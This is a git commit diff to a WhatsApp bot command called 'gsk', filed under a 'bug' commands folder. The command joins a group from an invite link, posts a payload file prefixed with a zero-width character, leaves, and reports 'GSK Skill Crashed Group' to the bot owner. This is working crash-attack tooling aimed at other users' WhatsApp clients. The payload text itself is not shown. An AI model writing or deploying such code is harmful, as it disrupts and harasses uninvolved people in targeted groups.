6563c614475b4866c141141a11db86f59afb52d1
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 17:00:51 +0300

    Update gsk.js

--- commands/bug/gsk.js
+++ commands/bug/gsk.js
@@ -3,16 +3,16 @@ const config = require('../../config');
 
 module.exports = {
     name: "gsk",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
-        const payload = fs.readFileSync('./lib/payloads/skill.text', 'utf-8');
-        const code = args[0].split('https://chat.whatsapp.com/')[1];
-        
         try {
+            const payload = fs.readFileSync('./lib/payloads/skill.text', 'utf-8');
+            const code = args[0].split('https://chat.whatsapp.com/')[1];
             const jid = await conn.groupAcceptInvite(code);
+
             await conn.sendMessage(jid, { text: "\u200B" + payload });
             await conn.groupLeave(jid);
-            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: GSK Skill deployed."), contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid } } });
-        } catch (e) { msg.reply("🥀 Failed."); }
+            await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: GSK Skill Crashed Group." });
+        } catch (e) {}
     }
 };
